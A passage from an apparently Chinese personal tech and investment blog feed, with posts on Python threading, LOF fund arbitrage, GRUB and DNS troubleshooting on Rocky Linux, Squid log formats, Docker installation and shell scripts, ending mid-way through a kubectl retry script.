<h2 id="第十二章-并发编程"><a href="#第十二章-并发编程" class="headerlink" title="第十二章 并发编程"></a>第十二章 并发编程</h2><h3 id="threading库创建线程"><a href="#threading库创建线程" class="headerlink" title="threading库创建线程"></a>threading库创建线程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">n</span>):</span><br><span class="line">	<span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;T-minus&#x27;</span>, n)</span><br><span class="line">		n -= <span class="number">1</span></span><br><span class="line">		time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create and launch a thread</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">t = Thread(target=countdown, args=(<span class="number">10</span>,))</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>
<h3 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h3><ul>
<li>使用Queue对象，Queue对象已包含必要锁，可以用它在多个线程间安全共享数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="comment"># A thread that produces data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>(<span class="params">out_q</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="comment"># Produce some data</span></span><br><span class="line">	...</span><br><span class="line">	out_q.put(data)</span><br><span class="line"><span class="comment"># A thread that consumes data</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>(<span class="params">in_q</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="comment"># Get some data</span></span><br><span class="line">		data = in_q.get()</span><br><span class="line">		<span class="comment"># Process the data</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># Create the shared queue and launch both threads</span></span><br><span class="line">q = Queue()</span><br><span class="line">t1 = Thread(target=consumer, args=(q,))</span><br><span class="line">t2 = Thread(target=producer, args=(q,))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br></pre></td></tr></table></figure>

<ul>
<li>对于生产者消费者速度有差异情况，可以为队列元素添加上限</li>
<li>get和put方法支持非阻塞方式和设定超时</li>
</ul>
<h3 id="x20-给关键代码加锁-——-使用threading库中的Lock对象"><a href="#x20-给关键代码加锁-——-使用threading库中的Lock对象" class="headerlink" title="&#x20;给关键代码加锁 —— 使用threading库中的Lock对象"></a>&#x20;给关键代码加锁 —— 使用threading库中的Lock对象</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">	XXX</span><br></pre></td></tr></table></figure>

<h2 id="第十三章-脚本编程与系统管理"><a href="#第十三章-脚本编程与系统管理" class="headerlink" title="第十三章 脚本编程与系统管理"></a>第十三章 脚本编程与系统管理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解析命令行选项</span><br><span class="line">argparse</span><br><span class="line">执行外部命令，获取输出</span><br><span class="line">subprocess.check\_output</span><br><span class="line">复制或启动文件</span><br><span class="line">shutil模块</span><br><span class="line">读取ini配置文件</span><br><span class="line">configparser</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>印度基金低风险套利回顾</title>
    <url>/2024/02/17/2024-02-17-india-lof-arbitrage/</url>
    <content><![CDATA[<p>2024年1月19日当天，印度基金(164824)开放申购，限额申购100元，当天溢价率13%左右，这个溢价率已经非常可观了，当然要祭出一拖七大法搞它一把！</p>
<span id="more"></span>

<p><img src="/2024/02/17/2024-02-17-india-lof-arbitrage/image1.png"></p>
<h2 id="一拖七套利原理简介"><a href="#一拖七套利原理简介" class="headerlink" title="一拖七套利原理简介"></a>一拖七套利原理简介</h2><p>详细的原理和方法可自行在雪球搜索，这里只做简单表述：</p>
<ul>
<li>印度基金(164824)是一个LOF基金，既可以在场内申赎，也可以在场内买卖</li>
<li>当LOF基金的价格高于净值时，可以通过先申购再卖出的方式进行溢价套利</li>
<li>印度基金T日在场内申购,  T+2日晚到账, T+3日可卖出；场外申购转托管在T+5日可卖出</li>
<li>对于深市的印度基金，可以用3个深市股东账户+3个深市封闭基金账户+1个TA账户进行申购，这样单身份证可以申购700元，这就是一拖七</li>
<li>必须有场内一折申购+免5的券商渠道，否则交易成本高达6%</li>
</ul>
<h2 id="操作记录"><a href="#操作记录" class="headerlink" title="操作记录"></a>操作记录</h2><p>从1月19日(周五)开始每天使用一拖七大法申购, 从1月24日开始每天早盘卖出，场外转托管, 直到2月8日(节前最后一个交易日)结束，每个身份证获利708元：<br><img src="/2024/02/17/2024-02-17-india-lof-arbitrage/image2.png"><br>如果下次遇到同样的机会，就继续薅羊毛吧 ~</p>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>全球芯片LOF大幅溢价，痛失巨肉我拍断大腿！</title>
    <url>/2024/03/10/2024-03-10-global-chip-lof-arbitrage/</url>
    <content><![CDATA[<p>3月8号当天，全球芯片LOF(501225)出现15%的大幅溢价。这只基每个身份证限额申购1万，这意味着如果你在3月5号申购，在3月8号收盘前卖出，一户收益高达1500元，3天收益率15%，简直是抢钱！在如此恐怖的收益率面前，高利贷都只能算个弟弟！</p>
<span id="more"></span>

<p><img src="/2024/03/10/2024-03-10-global-chip-lof-arbitrage/image1.png"></p>
<p>然而，我3月5号并没有申购，或者说完全没注意到这只鸡的存在，因为集思录里刚好没有收录这个基金，只能说获取信息的路子不够多啊。3月6号(周三)，我后知后觉，每户小额申购1千。</p>
<p><img src="/2024/03/10/2024-03-10-global-chip-lof-arbitrage/image2.jpg"></p>
<p>没有拉满到1万的原因是，我当时认为周三6个点的溢价不算太高，场内成交额不大，基金跟踪的费城半导体指数波动较大。结果没想到周四周五这货被连续爆炒，溢价冲上了惊人的15%！？？</p>
<p>算了下这波没拉满起码少赚了几千块，看到别人几个账户一天怒赚1万+，我真是拍断大腿，只能留下羡慕和悔恨的泪水~</p>
<p>打不过就加入！周五我继续小额参与了一把。15个点的溢价，承受两天的波动，风险在于英伟达的下跌带动基金净值下跌，以及下周三场内接盘侠不足导致溢价被抹平。</p>
<p><img src="/2024/03/10/2024-03-10-global-chip-lof-arbitrage/image3.webp"></p>
<p>吃肉还是吃面，下周三见分晓。</p>
<p>为什么穷？因为我对钱不够热爱啊！</p>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>每天的三哥小鸡腿没了</title>
    <url>/2024/03/13/2024-03-13-india-lof-arbitrage-end/</url>
    <content><![CDATA[<p>查看印度基金(164824)公告，从2024年2月28日起，暂停印度基金的申购，限额100块的一拖七套利告一段落。这意味着看好印度股市的国内投资者，以后只能通过在场内买入获得份额。</p>
<span id="more"></span>

<p><img src="/2024/03/13/2024-03-13-india-lof-arbitrage-end/image1.png"><br>关于暂停申购的原因，官方说是为<strong>保护基金持有人利益</strong>，这个说法真的是TM把我整乐了。太阳从西边出来了，镰刀喊着要保护韭菜的利益了，就问你信不信吧！真正原因我想应该是套利申购份额越来越多，基金公司外汇额度不够用了。为了保护所谓的投资者利益，每天放着这么多申购费都不赚，有钱不赚王八下蛋，这么有良心的基金公司把我感动的都快哭了！</p>
<p>印度基金作为唯一一支能投资三哥的基金，稀缺性比较强，目前溢价率在7%左右。后市缺少了套利大军的砸盘，估计溢价率会进一步抬升。如果你看好三哥市场，已经申购到手的份额不妨拿一拿，不急着卖，让子弹再飞一会。（个人利益相关，不构成投资建议）<br><img src="/2024/03/13/2024-03-13-india-lof-arbitrage-end/image2.png"></p>
<p>总结下，这次的套利行情从1月19日开始，到2月28日结束，时间竟然持续一个月之久。如果每天坚持一拖七申购卖出，一个账户可以获利近1000元，你能搞3个账户就赚3000元，6个账户就赚6000元 。而为了赚到这个钱需要做的，无非就是事先用几个小时学习下基金套利的知识，再准备好几台拖拉机而已，教程网上一搜一大把。</p>
<p>这简单吗？太简单了，市场送钱我只管接就完事了。</p>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>GRUB菜单不显示问题定位</title>
    <url>/2024/03/21/2024-03-21-grub-menu-not-display-troubleshooting/</url>
    <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>Rocky Linux 9.2环境，手工配置了<code>GRUB_TIMEOUT</code>为30秒，但重启后发现没有显示菜单，未出现30秒倒计时。</p>
<h1 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h1><p>梳理GRUB启动流程，下载GRUB源码并重新编译、安装、调试，具体步骤如下：</p>
<span id="more"></span>

<h1 id="0-梳理GRUB启动流程"><a href="#0-梳理GRUB启动流程" class="headerlink" title="0. 梳理GRUB启动流程"></a>0. 梳理GRUB启动流程</h1><p>Linux启动流程参考： <a href="https://www.cnblogs.com/quan0311/p/15292110.html">谈谈Linux系统启动流程</a><br>GRUB启动流程参考下图：(图片非原创，转载)<br><img src="/2024/03/21/2024-03-21-grub-menu-not-display-troubleshooting/image1.png"></p>
<h1 id="1-确认GRUB版本号"><a href="#1-确认GRUB版本号" class="headerlink" title="1. 确认GRUB版本号"></a>1. 确认GRUB版本号</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rpm -qa | grep grub</span></span><br><span class="line">grub2-pc-2.06</span><br><span class="line"><span class="comment"># grub2-install --version</span></span><br><span class="line">grub2-install (GRUB) 2.06</span><br></pre></td></tr></table></figure>
<p>得到GRUB版本号为2.06</p>
<h1 id="2-下载GRUB源码"><a href="#2-下载GRUB源码" class="headerlink" title="2. 下载GRUB源码"></a>2. 下载GRUB源码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.gz</span><br><span class="line">tar -xzvf grub-2.06.tar.gz</span><br><span class="line"><span class="built_in">cd</span> grub-2.06</span><br></pre></td></tr></table></figure>
<h1 id="3-修改GRUB源码，添加调试日志"><a href="#3-修改GRUB源码，添加调试日志" class="headerlink" title="3. 修改GRUB源码，添加调试日志"></a>3. 修改GRUB源码，添加调试日志</h1><p>修改<code>grub-core/normal/menu.c</code>中的函数<code>run_menu</code></p>
<ul>
<li>使用<code>grub_printf</code>函数添加日志打印<code>timeout</code>，<code>timeout_style</code>, <code>default_entry</code></li>
<li>使用<code>grub_millisleep</code>函数休指定休眠时间(单位毫秒，休眠目的是让日志停留一段时间，方便定位）<br><img src="/2024/03/21/2024-03-21-grub-menu-not-display-troubleshooting/image2.png"><br>kernel.img执行流程：<code>startup.S -&gt; grub_main -&gt; grub_load_normal_mode -&gt; grub_command_execute(&quot;normal&quot;, 0 ,0) -&gt; grub_show_menu -&gt; show_menu -&gt; run_menu -&gt; ...</code></li>
</ul>
<h1 id="4-编译和安装GRUB"><a href="#4-编译和安装GRUB" class="headerlink" title="4. 编译和安装GRUB"></a>4. 编译和安装GRUB</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y bison gcc flex  <span class="comment"># 安装必要依赖</span></span><br><span class="line">./configure --prefix=/usr	<span class="comment"># 笔者的RockyLinux9.2默认应安装到/usr, 其他环境只需后台确认下grub安装的路径，指定对应的prefix即可</span></span><br><span class="line">make <span class="comment"># 编译</span></span><br><span class="line">make install <span class="comment"># 安装</span></span><br><span class="line">grub2-install /dev/sda <span class="comment"># 重新安装GRUB到MBR, 根据你的环境把/dev/sda改成具体的虚拟硬盘设备</span></span><br></pre></td></tr></table></figure>
<h1 id="5-重启后，通过串口查看GRUB日志，确认修改生效"><a href="#5-重启后，通过串口查看GRUB日志，确认修改生效" class="headerlink" title="5. 重启后，通过串口查看GRUB日志，确认修改生效"></a>5. 重启后，通过串口查看GRUB日志，确认修改生效</h1><p>串口日志打印如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRUB loading.</span><br><span class="line">Welcome to GRUB!</span><br><span class="line">GET DEFAULT ENTRY: 0</span><br><span class="line">GET TIMEOUT: 1</span><br><span class="line">GET TIMEOUT STYLE: 2</span><br></pre></td></tr></table></figure>
<p>发现<code>timeout</code>值为1，<code>timeout_style</code>为2(TIMEOUT_STYLE_HIDDEN)，不符合预期的30秒设定，查看<code>/boot/grub2/grub.cfg</code>，找到了对应的代码段：<br><img src="/2024/03/21/2024-03-21-grub-menu-not-display-troubleshooting/image3.png"><br>通过<code>grub2-editenv</code>命令查看<code>menu_auto_hide</code>这个环境变量的确存在，且值为1，所以匹配了else语句，<code>timeout</code>的值被设置了1秒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># grub2-editenv - list | grep menu_auto_hide</span><br><span class="line">menu_auto_hide=1</span><br></pre></td></tr></table></figure>
<p>查看<a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/ref_notable-changes-to-boot-loader_assembly_kernel">Rocky Linux官方文档</a>，找到了<code>menu_auto_hide</code>环境变量被设置的原因，以及解决方法：<br><img src="/2024/03/21/2024-03-21-grub-menu-not-display-troubleshooting/image4.png"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>【1】 <a href="https://www.cnblogs.com/quan0311/p/15292110.html">谈谈Linux系统启动流程</a><br>【2】 <a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/ref_notable-changes-to-boot-loader_assembly_kernel">Red hat Customer Portal</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>GRUB</tag>
      </tags>
  </entry>
  <entry>
    <title>如何自定义Squid日志格式, 添加请求方法等参数</title>
    <url>/2024/03/21/2024-03-21-how-to-modify-squid-logformat/</url>
    <content><![CDATA[<p>查<a href="http://www.squid-cache.org/Doc/config/logformat/">Squid手册</a>，找到你需要添加的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field name syntax keys:</span><br><span class="line">	...</span><br><span class="line">	%rm</span><br><span class="line">	Request method</span><br><span class="line">	%ru</span><br><span class="line">	Request URL, without the query string</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p>修改Squid配置文件<code>/etc/squid/squid.conf</code>，在<code>logformat</code>开头的这一行中添加<code>%rm %ru</code>参数，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logformat customized  %tl %ts %6tr %&gt;a %Ss %03&gt;Hs %&gt;st %&lt;st %[un %Sh %&lt;A %mt <span class="string">&quot;%&#123;User-Agent&#125;&gt;h&quot;</span> %03&lt;Hs <span class="string">&quot;%rm %ru HTTP/%rv&quot;</span> %err_code</span><br><span class="line">access_log  /var/log/squid/access.log customized</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>重启Squid, 查看<code>access.log</code>, 发现日志格式已成功修改<br><img src="/2024/03/21/2024-03-21-how-to-modify-squid-logformat/image1.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.squid-cache.org/Doc/config/logformat/">http://www.squid-cache.org/Doc/config/logformat/</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>购买基金前应阅读基金招募说明书</title>
    <url>/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/</url>
    <content><![CDATA[<p>3月8号，华泰天金ETF(511670)离奇暴涨6.17%, 收盘价106.17元。作为一个净值100元的货币基金，正常收益一年也就2%，单日6%的溢价相当于用1天时间提前兑现3年的收益，一个货币基金也可以玩这么嗨，我实在是无法理解！</p>
<span id="more"></span>
<p><img src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image1.png"></p>
<p>据传言，是因为大爷大妈们看到基金的名字中带有黄金，误以为是投资黄金的ETF，所以一通乱买把价格炒上去了。3月12日，华泰天金ETF以100.999元收盘，单日暴跌7%，高溢价买入的”投资者”们损失惨重，着实当了一回韭菜。</p>
<p>从韭菜们的经历中，我们可以吸取教训：<strong>在购买一个基金前，我们需要知道这个基金的底层资产是什么</strong>，了解这个基金的投资范围，投资策略，基金费用，交易规则，这些信息可以在基金招募说明书里找到。</p>
<p>以华泰天金ETF为例，可以从华泰官网上找到基金招募说明书。查看“基金的投资”部分，可以看出这是货币基金。<br><img src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image2.png"></p>
<p>查看基金说明书中“基金份额的申购与赎回”部分，发现华泰天金ETF的净值始终为100元，无申购赎回费，T日申购T+2日到账。<br><img src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image3.png"><br><img src="/2024/03/22/2024-03-22-read-fund-prospectus-before-buy-funds/image4.png"></p>
<p>这意味着，如果你在3月8号以净值100元申购，3月12日以开盘价102元卖出，4天收益率2%，年化收益高达182%！<strong>韭菜们的钱，挺容易赚的</strong> ^_^</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>标普500LOF又来送钱，一拖七拖拉机开起来！</title>
    <url>/2024/03/22/2024-03-22-sp500-lof-give-money/</url>
    <content><![CDATA[<p>标普500LOF(161125)公告，3月22日开放申购，限额申购100元，溢价率达到了离谱的40%！！！为了平抑这不合理的溢价，我决定用一拖七拖拉机狠狠拖它一把！</p>
<span id="more"></span>
<p><img src="/2024/03/22/2024-03-22-sp500-lof-give-money/image1.png"><br><strong>一拖七的注意事项：</strong></p>
<ul>
<li>标普500LOF属于深市基金，一个身份证可以使用3个深A账户+3个深基金账户+1个场外账户进行一拖七申购，这样每天可以申购100*7&#x3D;700元，收益放大七倍，多个身份证可以继续放大收益。</li>
<li>T日(3月22日)申购的份额，在T+2日(3月26日)晚上到达持仓, 在T+3日(3月27日)早盘可以卖出。</li>
<li>必须记住T日的操作是场内申购，千万别点错点成在场内买入！</li>
<li>你需要有场内申购费1折+没有最低5元消费限制的券商，否则申购100元的交易成本高达6%以上，纯给券商打工。</li>
</ul>
<p><strong>如何打造一拖七拖拉机：</strong></p>
<ul>
<li>你需要有华宝和银河账户，支持加挂3个深市股东号和3个深基金号，实现一键拖拉机申购，如下：<br><img src="/2024/03/22/2024-03-22-sp500-lof-give-money/image2.jpeg"></li>
<li>没有开满6个深市股东&#x2F;基金号的，可以在银河增开。可以在公众号”中国结算营业厅”里查询自己所有的股东号。</li>
<li>增开可以在非交易时间进行。每次增开时，勾选1个深a加1个深基金，需上传身份证照片和视频，做电话回访，开满6个深市股东&#x2F;基金号需要最多3天时间。</li>
</ul>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双网卡环境概率出现DNS解析错误</title>
    <url>/2024/03/27/2024-03-27-dns-resolve-fail-on-dual-nic-vm/</url>
    <content><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>VMware Rocky Linux 9 虚拟机, 双网卡(eth0和eth1)配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eth0 10.206.216.27/24  DNS 10.204.16.18</span><br><span class="line">eth1 192.168.1.27/24   DNS 192.168.1.1</span><br></pre></td></tr></table></figure>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>手动配置eth1的DNS后，网络不通，通过抓包发现是eth1的DNS server配置有误，<strong>但机器重启后网络有概率能恢复正常</strong>。</p>
<span id="more"></span>
<h2 id="定位方法"><a href="#定位方法" class="headerlink" title="定位方法"></a>定位方法</h2><p>在网络不通的时候，查看<code>/etc/resolv.conf</code>内容：<br><img src="/2024/03/27/2024-03-27-dns-resolve-fail-on-dual-nic-vm/image1.png"><br>找到原因：<strong>libc解析器不支持超过3条以上的nameserver</strong>，网络不通的时候，可以正常工作的nameserver 10.204.16.18恰好在第4条，所以DNS解析失败。</p>
<p>解决方法：删掉第二、三行这两个系统自动生成的v6 dns server，保证<code>resolv.conf</code>里的nameserver记录不超过3条即可。</p>
<p>注意不要直接修改<code>/etc/resolv.conf</code>，RHEL9上删除nameserver可以使用<code>nmcli</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmcli con mod eth0 ipv6.ignore-auto-dns yes</span><br><span class="line">nmcli con mod eth1 ipv6.ignore-auto-dns yes</span><br><span class="line">systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://man7.org/linux/man-pages/man5/resolv.conf.5.html">man resolv.conf</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>判断两个IP地址是否在同一网段(Shell实现)</title>
    <url>/2024/03/28/2024-03-28-check-two-ip-in-same-network/</url>
    <content><![CDATA[<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：提取 CIDR 的网络地址和子网掩码</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">extract_network</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">extract_subnet</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$1</span> | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数：将 IP 地址转换为二进制格式</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">ip_to_binary</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> ip=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> binary=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">local</span> IFS=<span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="built_in">local</span> octets=(<span class="variable">$ip</span>)</span><br><span class="line">    <span class="keyword">for</span> octet <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;octets[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">local</span> bin_octet=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">local</span> num=<span class="variable">$octet</span></span><br><span class="line">        <span class="keyword">for</span> (( i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">            bin_octet=$((num % <span class="number">2</span>))<span class="variable">$bin_octet</span></span><br><span class="line">            num=$((num / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        binary+=<span class="variable">$bin_octet</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$binary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数：比较两个 IP 地址是否在同一网段</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">same_network</span></span>() &#123;</span><br><span class="line">    network1=$(extract_network <span class="variable">$1</span>)</span><br><span class="line">    subnet1=$(extract_subnet <span class="variable">$1</span>)</span><br><span class="line">    network2=$(extract_network <span class="variable">$2</span>)</span><br><span class="line">    subnet2=$(extract_subnet <span class="variable">$2</span>)</span><br><span class="line"></span><br><span class="line">    binary1=$(ip_to_binary <span class="variable">$network1</span>)</span><br><span class="line">    binary2=$(ip_to_binary <span class="variable">$network2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 截取相同长度的二进制子串</span></span><br><span class="line">    binary1=$(<span class="built_in">echo</span> <span class="variable">$binary1</span> | <span class="built_in">cut</span> -c1-<span class="variable">$subnet1</span>)</span><br><span class="line">    binary2=$(<span class="built_in">echo</span> <span class="variable">$binary2</span> | <span class="built_in">cut</span> -c1-<span class="variable">$subnet2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$binary1</span>&quot;</span> == <span class="string">&quot;<span class="variable">$binary2</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;两个 CIDR 在同一网段&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;两个 CIDR 不在同一网段&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>CIDR1&#x3D;”10.206.216.21&#x2F;24”<br>CIDR2&#x3D;”10.206.217.10&#x2F;24”<br>same_network $CIDR1 $CIDR2</p>
]]></content>
      <categories>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7.9上安装Docker</title>
    <url>/2024/03/28/2024-03-28-how-to-install-docker-on-centos7/</url>
    <content><![CDATA[<p>移除旧版本Docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br></pre></td></tr></table></figure>

<p>安装依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>添加Docker存储库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>启动Docker服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p>查看Docker版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">Docker version 25.0.2, build 29cf629</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>kubectl执行失败后等待一段时间重试(Shell实现)</title>
    <url>/2024/03/28/2024-03-28-kubectl-add-retry/</url>
    <content><![CDATA[<p>使用Shell脚本实现功能： <code>kubectl</code>执行失败后，等待30秒后再重试，一共重试3次，代码如下：</p>
<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">KUBECTL_BIN=/var/lib/snapd/snap/bin/kubectl</span><br><span class="line"></span><br><span class="line">ERR_MSG_K8S_NOTRUNNING=<span class="string">&quot;microk8s is not running&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_TIMEOUT=<span class="string">&quot;connection timed out&quot;</span></span><br><span class="line">ERR_MSG_CONNECTION_REFUSED=<span class="string">&quot;refused - did you specify the right host or port&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">debuglog</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> log_content=<span class="variable">$&#123;@:1&#125;</span></span><br><span class="line">    <span class="built_in">local</span> <span class="built_in">caller</span>=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`date +&quot;</span>%Y-%m-%d %H:%M:%S<span class="string">&quot;` [<span class="variable">$caller</span>] INFO <span class="variable">$log_content</span>&quot;</span> 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectlX</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> retry=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="built_in">local</span> args=<span class="variable">$@</span></span><br><span class="line">    <span class="built_in">local</span> ret=0</span><br><span class="line">    <span class="built_in">local</span> cmdstr=<span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> tmpfile=$(<span class="built_in">mktemp</span>)</span><br><span class="line">    <span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$retry</span>;i++)); <span class="keyword">do</span></span><br><span class="line">        <span 